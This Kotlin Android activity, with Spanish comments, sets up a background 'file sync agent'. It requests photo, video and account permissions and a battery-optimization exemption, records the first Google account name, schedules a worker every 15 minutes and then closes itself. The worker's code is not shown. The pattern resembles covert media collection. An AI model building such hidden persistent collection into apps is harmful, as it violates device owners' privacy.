package com.example.myapplicationon

import android.Manifest
import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.*
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    // Launcher que gestiona la respuesta del usuario al diálogo de optimización de batería
    private val batteryOptimizationLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        Log.d("MainActivity", "Diálogo de optimización de batería cerrado.")
        // Después de que el usuario interactúa (acepte o no), procedemos con el siguiente paso
        ensureDeviceIdentity()
        startSyncWorker()
    }

    // Launcher que gestiona la respuesta del usuario al diálogo de permisos de archivos/cuentas
    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
        if (permissions.entries.all { it.value }) {
            Log.d("MainActivity", "Permisos de archivos y cuentas concedidos.")
            // Si los permisos se conceden, el siguiente paso es pedir la exclusión de batería
            requestBatteryOptimizationExemption()
        } else {
            Log.w("MainActivity", "Permisos denegados. La app no puede funcionar.")
            Toast.makeText(this, "Los permisos son necesarios para el funcionamiento del agente.", Toast.LENGTH_LONG).show()
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        // El flujo siempre empieza aquí
        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        val requiredPermissions = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissions.addAll(listOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO))
        } else {
            requiredPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        requiredPermissions.add(Manifest.permission.GET_ACCOUNTS)

        val permissionsToGrant = requiredPermissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }

        if (permissionsToGrant.isNotEmpty()) {
            requestPermissionLauncher.launch(permissionsToGrant.toTypedArray())
        } else {
            // Si ya tenemos los permisos, pasamos directamente a la solicitud de batería
            requestBatteryOptimizationExemption()
        }
    }

    @SuppressLint("BatteryLife")
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val packageName = this.packageName
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Log.i("MainActivity", "Solicitando exclusión de optimización de batería...")
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryOptimizationLauncher.launch(intent)
            } else {
                Log.i("MainActivity", "La app ya está excluida de la optimización de batería.")
                ensureDeviceIdentity()
                startSyncWorker()
            }
        } else {
            // En versiones antiguas de Android, no es necesario
            ensureDeviceIdentity()
            startSyncWorker()
        }
    }

    @SuppressLint("MissingPermission")
    private fun ensureDeviceIdentity() {
        val sharedPrefs = getSharedPreferences("FileSyncPrefs", Context.MODE_PRIVATE)
        if (!sharedPrefs.contains("device_id")) {
            val newId = UUID.randomUUID().toString()
            var accountName = "Sin Cuenta"
            try {
                val accounts = AccountManager.get(this).getAccountsByType("com.google")
                if (accounts.isNotEmpty()) {
                    accountName = accounts[0].name
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "No se pudo acceder a las cuentas", e)
            }
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            val descriptiveName = "$deviceModel ($accountName)"

            sharedPrefs.edit()
                .putString("device_id", newId)
                .putString("device_name", descriptiveName)
                .apply()
            Log.i("MainActivity", "Nueva identidad de dispositivo creada: $descriptiveName")
        }
    }

    private fun startSyncWorker() {
        val syncRequest = PeriodicWorkRequestBuilder<FileSyncWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("FileSyncAgentWork", ExistingPeriodicWorkPolicy.KEEP, syncRequest)
        Log.i("MainActivity", "Agente programado con éxito. La app se cerrará.")
        Toast.makeText(this, "Agente Activado", Toast.LENGTH_SHORT).show()
        finish()
    }
}


